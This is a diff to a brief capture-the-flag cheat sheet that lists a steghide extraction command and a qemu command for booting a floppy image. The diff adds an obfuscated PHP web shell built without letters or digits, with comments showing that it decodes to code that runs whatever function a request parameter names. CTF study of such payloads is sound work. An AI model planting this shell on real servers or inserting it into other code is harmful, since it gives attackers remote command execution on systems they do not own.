@@ -1,3 +1,8 @@
 ####CTF-like Tools
 Extract Data from JPG----steghide -extract -p &lt;password&gt; -sf &lt;file&gt;
 Boot a DOS/MBR Image----qemu-system-i386 floppy.img; vncviewer 127.0.0.1
+PHP Webshell without alphanum----"""
+&lt;?=$_='$&lt;&gt;/'^'{{{{';${$_}[_](${$_}[__]);
+// $_= '$&lt;&gt;/' ^ '{{{{' ----&gt; $_ = '_GET'
+// ${_GET}[_](${_GET})[__];
+// final &lt;?=$_GET[_]($_GET[__])"""
